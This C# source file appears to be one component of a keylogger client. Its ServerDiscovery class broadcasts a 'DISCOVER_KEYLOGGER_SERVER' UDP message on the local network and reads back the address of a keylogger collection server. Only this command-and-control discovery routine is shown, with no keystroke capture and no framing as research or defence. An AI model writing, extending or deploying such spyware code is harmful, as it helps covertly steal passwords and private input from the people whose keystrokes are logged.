using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace KeyloggerClient
{
    public static class ServerDiscovery
    {
        public static async Task<string> DiscoverServerAsync(int udpPort = 6000, int timeoutMs = 2000)
        {
            using (UdpClient udpClient = new UdpClient(new IPEndPoint(IPAddress.Any, 0)))
            {
                try
                {
                    udpClient.EnableBroadcast = true;

                    IPEndPoint broadcastEP = new IPEndPoint(IPAddress.Broadcast, udpPort);
                    byte[] discoveryMessage = Encoding.UTF8.GetBytes("DISCOVER_KEYLOGGER_SERVER");
                    await udpClient.SendAsync(discoveryMessage, discoveryMessage.Length, broadcastEP);

                    var receiveTask = udpClient.ReceiveAsync();
                    if (await Task.WhenAny(receiveTask, Task.Delay(timeoutMs)) == receiveTask)
                    {
                        var result = receiveTask.Result;
                        string response = Encoding.UTF8.GetString(result.Buffer);
                        if (response.StartsWith("KEYLOGGER_SERVER_RESPONSE:"))
                        {
                            return response.Substring("KEYLOGGER_SERVER_RESPONSE:".Length);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("UDP discovery error: " + ex.Message);
                    return null;
                }
            }

            return null;
        }
    }
}
